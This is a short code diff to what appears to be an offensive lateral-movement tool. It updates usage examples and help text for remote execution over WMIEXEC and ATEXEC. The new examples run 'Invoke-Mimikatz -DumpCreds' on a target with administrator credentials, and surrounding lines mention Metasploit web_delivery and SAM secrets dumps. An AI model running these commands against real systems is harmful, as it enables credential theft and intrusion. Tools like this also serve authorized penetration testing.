@@ -4939,7 +4939,7 @@ WMIEXEC PowerShell Mimikatz Memory Injector:
 WMIEXEC Metasploit web_delivery Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
 WMIEXEC Custom Code Memory Injector:
-    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds"
 ATEXEC Command Execution:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
 ATEXEC PowerShell Mimikatz Memory Injector:
@@ -4947,7 +4947,7 @@ ATEXEC PowerShell Mimikatz Memory Injector:
 ATEXEC Metasploit web_delivery Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
 ATEXEC Custom Code Memory Injector:
-    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds" --no-encoder
 SECRETSDUMP Custom Code Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
 Create Pasteable Mimikatz Attack:
@@ -4979,7 +4979,7 @@ Create Pasteable Executor Attack:
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Executes Mimikatz-Invoker against target systtems")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
     attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a Secrets Dump, which includes the SAM")
-    attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
+    attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script or Binary stored in current working directory")
     attack.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe shell")
     attack.add_argument("--domain-group-members", action="store", dest="domain_group", help="Identifies members of Domain Groups through PowerShell")
     attack.add_argument("--local-group-members", action="store", dest="local_group", help="Identifies members of Local Groups through PowerShell")
